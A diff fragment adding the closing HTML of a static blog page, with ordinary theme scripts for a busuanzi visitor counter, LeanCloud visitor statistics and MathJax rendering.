+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
